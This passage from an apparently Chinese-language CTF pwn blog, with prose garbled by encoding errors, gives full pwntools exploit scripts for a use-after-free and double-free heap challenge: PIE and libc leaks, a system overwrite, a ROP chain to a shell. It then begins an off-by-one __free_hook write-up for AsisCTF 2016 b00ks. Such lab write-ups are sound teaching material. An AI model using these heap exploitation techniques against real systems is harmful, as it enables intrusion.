¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h4><p>åˆ©ç”¨pieåŸºå€ï¼Œæ³„éœ²libcå³å¯</p><p>payload&#x3D;bâ€™aâ€™*4+bâ€™%15$pâ€™.ljust(20,bâ€™bâ€™)+p64(printf_plt)<br>create(len(payload),payload)<br>delete(1)<br>ru(bâ€™aâ€™*4)<br>_IO_file_write&#x3D;int(r(14),16)-45<br>p(â€˜_IO_file_writeâ€™,_IO_file_write)</p><h4 id="è¦†ç›–ä¸ºsystem"><a href="#è¦†ç›–ä¸ºsystem" class="headerlink" title="è¦†ç›–ä¸ºsystem"></a>è¦†ç›–ä¸ºsystem</h4><p>æ‹¿åˆ°shell</p><p><img src="/2023/03/04/Using-After-Free/image-20230307174939515.png" alt="image-20230307174939515"></p><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn-f&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;create &quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Pls give string size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;str:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;delete&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;id:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Are you sure?:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">db(<span class="string">&#x27;b *$rebase(0xe93)&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;hello&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;grxer&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\x1a&#x27;</span></span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">pie=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0xD1A</span></span><br><span class="line"><span class="comment"># s(b&#x27;quit &#x27;)</span></span><br><span class="line">p(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line">printf_plt=pie+elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+<span class="string">b&#x27;%22$p&#x27;</span>.ljust(<span class="number">20</span>,<span class="string">b&#x27;b&#x27;</span>)+p64(printf_plt)</span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">_IO_2_1_stdout_=<span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">p(<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>,_IO_2_1_stdout_)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>,_IO_2_1_stdout_)</span><br><span class="line">base=_IO_2_1_stdout_-libc.dump(<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;sh;&#x27;</span>.ljust(<span class="number">24</span>,<span class="string">b&#x27;1&#x27;</span>)+p64(system)</span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‰é¢è¿™ç§æ–¹æ³•ä¸çŸ¥é“ä¸ºä»€ä¹ˆåœ¨é«˜ç‰ˆæœ¬glibcä¸‹æ‹¿ä¸åˆ°shellï¼Œè¿™é‡Œæˆ‘ä»¬å†deleteæ˜¯å‘ç°ä¼šåœ¨æ ˆä¸Šè¾“å…¥ï¼Œè¿™æ ·æˆ‘ä¹Ÿå¯ä»¥æ„é€ ropé“¾æ¥æ‹¿åˆ°shell</p><p><img src="/2023/03/04/Using-After-Free/image-20230308005837886.png" alt="image-20230308005837886"></p><p>æˆ‘ä»¬éœ€è¦è¾“å…¥yeså 8ä¸ªå­—èŠ‚ç»•è¿‡strncmpï¼Œç„¶åå››ä¸ªpopåˆ°åé¢retçš„åœ°å€ï¼Œè¿›è¡Œrop</p><p><img src="/2023/03/04/Using-After-Free/image-20230308011254973.png" alt="image-20230308011254973"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn-f&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;create &quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Pls give string size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;str:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;delete&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;id:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Are you sure?:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">db(<span class="string">&#x27;b *$rebase(0xe93)&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;hello&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;grxer&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\x1a&#x27;</span></span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">pie=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0xD1A</span></span><br><span class="line"><span class="comment"># s(b&#x27;quit &#x27;)</span></span><br><span class="line">p(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line">printf_plt=pie+elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+<span class="string">b&#x27;%15$p&#x27;</span>.ljust(<span class="number">20</span>,<span class="string">b&#x27;b&#x27;</span>)+p64(printf_plt)</span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">_IO_file_write=<span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">45</span></span><br><span class="line">p(<span class="string">&#x27;_IO_file_write&#x27;</span>,_IO_file_write)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;_IO_file_write&#x27;</span>,_IO_file_write)</span><br><span class="line">base=_IO_file_write-libc.dump(<span class="string">&#x27;_IO_file_write&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">pop4=pie+<span class="number">0x00000000000011dc</span></span><br><span class="line">rdi=<span class="number">0x00000000000011e3</span>+pie</span><br><span class="line">p(<span class="string">&#x27;bin_sh&#x27;</span>,bin_sh)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(pop4)</span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;3.quit\n&quot;</span>,<span class="string">&quot;delete &quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;delete\nid:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">payload= <span class="string">b&quot;yesaaaaa&quot;</span> + p64(rdi) + p64(bin_sh) + p64(<span class="number">0x949</span>+pie)+p64(system)</span><br><span class="line">sla(<span class="string">&quot;sure?:&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p>æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨éƒ½å˜äº†freeæ¥åšfreeå‡½æ•°è°ƒç”¨hook</p><p>å¦‚æœæˆ‘ä»¬å…ˆç”³è¯·ä¸¤ä¸ªstring chunk</p><p>create(5,bâ€™helloâ€™)<br>create(5,bâ€™grxerâ€™)</p><p>å†é‡Šæ”¾</p><p>delete(0)<br>delete(1)<br>delete(0)</p><p>è¿™æ ·æˆ‘ä»¬çš„fastbinä¼šåœ¨0å’Œ1ç›´æ¥æœ‰ä¸€ä¸ªå›ç¯é“¾è¡¨</p><p><img src="/2023/03/04/Using-After-Free/image-20230308124636807.png" alt="image-20230308124636807"></p><p>æˆ‘ä»¬å†æ¬¡</p><p>create(4, bâ€™fsfâ€™)<br>create(0x20, bâ€™aâ€™ * 0x16 + bâ€™loâ€™ + bâ€™\x2d\x00â€™)</p><p>ç¬¬ä¸€ä¸ªcreateä¼šç”³è¯·åˆ°ç¬¬ä¸€ä¸ªstringå †å—ï¼Œç¬¬äºŒä¸ªcreatä¼šç”³è¯·åˆ°ç¬¬äºŒä¸ªstringå †å—ï¼Œå’Œç¬¬ä¸€ä¸ªstringå †å—ä½œä¸ºcontextå­˜å‚¨åŒºï¼Œè€Œæˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªcreatä¼šæŠŠè¯¥å—å½“ä½œè‡ªå·±çš„structï¼Œè¿™æ ·å°±å¯ä»¥æ§åˆ¶å®ƒçš„freeæŒ‡é’ˆï¼Œæ”¹å†™ä¸ºputsæŒ‡é’ˆè¾“å‡ºputsåœ°å€ï¼Œæ‰¾åˆ°åŸºå€</p><p><img src="/2023/03/04/Using-After-Free/image-20230308125210074.png" alt="image-20230308125210074"></p><p>æˆ‘ä»¬å†æ¬¡delete(1),å†æ¬¡ç”³è¯·ä¸€ä¸ªcontextå¤§äº0xf&lt;&#x3D;0x28çš„chunkå³å¯å¾ªç¯åˆ©ç”¨</p><h4 id="exp-è¿™é‡Œåªæ³„éœ²å’Œå¾ªç¯åˆ©ç”¨ï¼Œé…åˆå‰é¢çš„ä¸¤ç§æ€è·¯çš„ä»»ä½•ä¸€ç§éƒ½å¯ä»¥"><a href="#exp-è¿™é‡Œåªæ³„éœ²å’Œå¾ªç¯åˆ©ç”¨ï¼Œé…åˆå‰é¢çš„ä¸¤ç§æ€è·¯çš„ä»»ä½•ä¸€ç§éƒ½å¯ä»¥" class="headerlink" title="exp è¿™é‡Œåªæ³„éœ²å’Œå¾ªç¯åˆ©ç”¨ï¼Œé…åˆå‰é¢çš„ä¸¤ç§æ€è·¯çš„ä»»ä½•ä¸€ç§éƒ½å¯ä»¥"></a>exp è¿™é‡Œåªæ³„éœ²å’Œå¾ªç¯åˆ©ç”¨ï¼Œé…åˆå‰é¢çš„ä¸¤ç§æ€è·¯çš„ä»»ä½•ä¸€ç§éƒ½å¯ä»¥</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn-f&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;create &quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Pls give string size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;str:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit\n&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;delete &quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;id:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Are you sure?:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">db(<span class="string">&#x27;b *$rebase(0xe93)&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;hello&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;grxer&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">4</span>, <span class="string">b&#x27;fsf&#x27;</span>)</span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x16</span> + <span class="string">b&#x27;lo&#x27;</span> + <span class="string">b&#x27;\x2d\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x16</span> + <span class="string">b&#x27;lo&#x27;</span> + <span class="string">b&#x27;\x2d\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Double Free </tag>
            
            <tag> Using After Free </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OFF-BY-ONE AsisCTF2016b00ks</title>
      <link href="/2023/03/02/AsisCTF2016b00ks-OBO/"/>
      <url>/2023/03/02/AsisCTF2016b00ks-OBO/</url>
      
        <content type="html"><![CDATA[<h1 id="AsisCTF-2016-b00ks-OFF-BY-ONE"><a href="#AsisCTF-2016-b00ks-OFF-BY-ONE" class="headerlink" title="AsisCTF-2016-b00ks OFF-BY-ONE"></a>AsisCTF-2016-b00ks OFF-BY-ONE</h1><p>é¢˜ç›®é“¾æ¥ï¼š<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks</a></p><p>__free_hook and off by one</p><span id="more"></span><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302015134670.png" alt="image-20230302015134670"></p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302012924030.png" alt="image-20230302012924030"></p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302010143341.png" alt="image-20230302010143341"></p><p>æœ‰æ¼æ´ä¼šå¤šè¯»å–ä¸€ä¸ªå­—èŠ‚çš„&#x2F;x00</p><p>author nameå­˜æ”¾åœ¨unk_202040+pieå¤„ï¼Œ32ä¸ªå­—èŠ‚</p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302011350558.png" alt="image-20230302011350558"></p><p>åˆ†æåå¯ä»¥æ¨æ–­å‡ºbookç»“æ„ä½“æ˜¯å¦‚ä¸‹çš„ï¼Œè€Œä¸”åœ¨unk_202060+pieå¤„å¼€å§‹å­˜æ”¾ç»“æ„ä½“æŒ‡é’ˆï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œä¸€ä¸ªå­—èŠ‚çš„æº¢å‡ºï¼Œæ¥æ§åˆ¶book1çš„æœ€ä½ä½åœ°å€</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">int</span> id;</span><br><span class="line"><span class="type">void</span> * book_name;</span><br><span class="line"><span class="type">void</span> *book_description;</span><br><span class="line"><span class="type">int</span> description_size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å­—èŠ‚å¯¹é½åæœ€ç»ˆå åˆ°32å­—èŠ‚</span></span><br></pre></td></tr></table></figure><h3 id="æ³„éœ²book1åœ°å€"><a href="#æ³„éœ²book1åœ°å€" class="headerlink" title="æ³„éœ²book1åœ°å€"></a>æ³„éœ²book1åœ°å€</h3><p>è¾“å…¥32ä¸ªå­—èŠ‚nameå†æ‰“å°å°±å¯ä»¥æ³„éœ²</p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302012108199.png" alt="image-20230302012108199"></p><h3 id="å®ç°å¯æ§"><a href="#å®ç°å¯æ§" class="headerlink" title="å®ç°å¯æ§"></a>å®ç°å¯æ§</h3><p>æˆ‘ä»¬å†æ¬¡ä¿®æ”¹anotherâ€”â€”nameä¼šå†æ¬¡æŠŠ0x2060å¤„è¦†ç›–ä¸º0ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬book1çš„ç»“æ„ä½“åœ°å€å¾€ä½åœ°å€èµ°äº†ï¼Œè€Œæˆ‘ä»¬mallocçš„æ—¶å€™é¡ºåºæ˜¯ book_nameâ€“&gt;book_descriptionâ€“&gt;book_struct</p><p>æ‰€æœ‰æˆ‘ä»¬å¯ä»¥é€šè¿‡è®¡ç®—æŠŠbook1åœ°å€å˜ä¸ºbook_description(å…·ä½“ä¸ºç”³è¯·ä¸€ä¸ªè¾ƒå¤§çš„descriptionï¼Œæœ‰åˆ©äºæˆ‘ä»¬book1è½åœ¨ä¸Šé¢ï¼Œé€šè¿‡å¯¹booknameæ§åˆ¶è°ƒæ•´å¯ä»¥å‡†ç¡®è½åœ¨ä»€ä¹ˆ)ï¼Œæˆ‘ä»¬çš„descriptionå¯ä»¥å†æ¬¡ä¿®æ”¹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨book1çš„desä¼ªé€ ä¸€ä¸ªbookç»“æ„ä½“ï¼Œå¦‚æœè¯´æˆ‘ä»¬æŠŠä¼ªé€ ç»“æ„ä½“çš„desæ”¹ä¸ºbook2çš„descriptionåœ°å€ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹1çš„desä¸ºæƒ³è¦è¯»å†™åœ°å€ï¼Œå†é€šè¿‡</p><p>book2çš„desè¿›è¡Œä¿®æ”¹å’Œè¯»å–</p><h3 id="è¯»å†™ä»€ä¹ˆ"><a href="#è¯»å†™ä»€ä¹ˆ" class="headerlink" title="è¯»å†™ä»€ä¹ˆ"></a>è¯»å†™ä»€ä¹ˆ</h3><p>å¼€å¯äº†FULL RELROï¼Œä¸èƒ½æ”¹å†™gotè¡¨ï¼Œç¨‹åºä¸­ç”¨åˆ°äº†freeå’Œmallocå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥æ‰“free_hookï¼Œå°†free å‡½æ•°hookä¸ºsystemï¼Œdescriptionä¿®æ”¹ä¸ºbinshåœ°å€ï¼Œè¿™æ ·æˆ‘ä»¬free(description)å°±å¯ä»¥æ‹¿åˆ°shellï¼Œè¦æ‹¿åˆ°__free_hookåœ°å€æˆ‘ä»¬è¿˜éœ€è¦æ³„éœ²libcçš„åŸºå€ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨mallocç”³è¯·å¤§å†…å­˜ï¼Œè¿™æ ·mallocå°±ä¼šè°ƒç”¨mmapç›´æ¥æ˜ å°„ä¸€å—å†…å­˜ç»™æˆ‘ä»¬ï¼Œ</p><p>è¿™å—å†…å­˜å’Œlibcçš„åŸºåœ°å€æ˜¯å›ºå®šçš„ï¼Œæˆ‘ä»¬å¯ä»¥æ³„éœ²desåœ°å€ï¼Œé€šè¿‡å‡å»å›ºå®šåç§»å¾—åˆ°libcåŸºå€</p><p>create_book(0x21000, â€œtwoâ€, 0x21000, â€œtwodesâ€)</p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302020528381.png" alt="image-20230302020528381" style="zoom: 67%;"><p>å¾—åˆ°åç§»ï¼Œ0x7f3100400000-0x7f31003bc010&#x3D;0x43FF0</p><p>è¿™é‡Œåç§»è¿˜éœ€è¦æŠŠaslrå…³æ‰ï¼Œä¸å…³é—­ä¼šéšæœºåŒ–ï¼Œè¯•äº†ä¸€ä¸‹libc2.35ä¼šéšæœºï¼Œ2.23ä¸ä¼šï¼Œè¿œç¨‹çš„è¯å¯èƒ½è¦åˆ©ç”¨binså»æ³„éœ²åŠ¨æ€åœ°å€</p><blockquote><p>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space </p><ul><li>0 &#x3D; å…³é—­</li><li>1 &#x3D; åŠéšæœºã€‚å…±äº«åº“ã€æ ˆã€mmap() ä»¥åŠ VDSO å°†è¢«éšæœºåŒ–ã€‚</li><li>2 &#x3D; å…¨éšæœºã€‚é™¤äº†1ä¸­æ‰€è¿°ï¼Œè¿˜æœ‰heapã€‚</li><li>ASLR ä¸è´Ÿè´£ä»£ç æ®µä»¥åŠæ•°æ®æ®µçš„éšæœºåŒ–å·¥ä½œï¼Œè¿™é¡¹å·¥ä½œç”± PIE è´Ÿè´£ã€‚ä½†æ˜¯åªæœ‰åœ¨å¼€å¯ ASLR ä¹‹åï¼ŒPIE æ‰ä¼šç”Ÿæ•ˆã€‚</li></ul></blockquote><p>ç”±äºæˆ‘ä»¬ç¬¬äºŒæ¬¡ç”³è¯·çš„å†…å­˜éƒ½è¿‡å¤§ï¼Œéƒ½é‡‡ç”¨vmmapï¼Œæ‰€ä»¥malloc book2æ—¶ä¹‹åç¬¬ä¸€ä¸ªbook1åœ°å€é—´éš”0x30ï¼ˆæ•°æ®å¤§å°0x20+chunk_head(0x10)ï¼‰</p><p>ä¼ªé€ book1ï¼Œpayload&#x3D;p64(1) + p64(book_two_ad + 8)+p64(book_two_ad+16)+ p64(140)</p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302022645243.png" alt="image-20230302022645243"></p><p>å¸ƒç½®å¥½ä¹‹åï¼Œfree</p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302141959390.png" alt="image-20230302141959390"></p><p>æœ¬æ¥æ˜¯è¦æ‹¿åˆ°shellçš„å¯æ˜¯2.35libcå·²ç»åˆ 